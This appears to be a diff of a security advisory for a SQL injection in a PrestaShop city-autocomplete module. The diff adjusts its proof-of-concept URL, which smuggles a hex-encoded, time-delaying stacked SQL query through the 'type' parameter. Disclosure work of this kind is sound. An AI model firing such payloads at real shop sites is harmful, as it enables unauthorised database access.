@@ -56,7 +56,7 @@ This exploit uses a PrestaShop front controller and most attackers can conceal t
 ## Proof of concept
 
 ```bash
-https://example.test/module/cityautocomplete/autocompletion?q=39000&type=1;select(0x73656C65637420736C656570283432293B)INTO@a;prepare`b`from@a;execute`b`;--;&input_name=postcode&limit=10
+https://example.test/module/cityautocomplete/autocompletion?q=39000&type=1;select(0x73656C65637420736C656570283432293B)INTO@a;prepare`b`from@a;execute`b`;--&input_name=postcode&limit=10
 ```
 
 ## Patch 
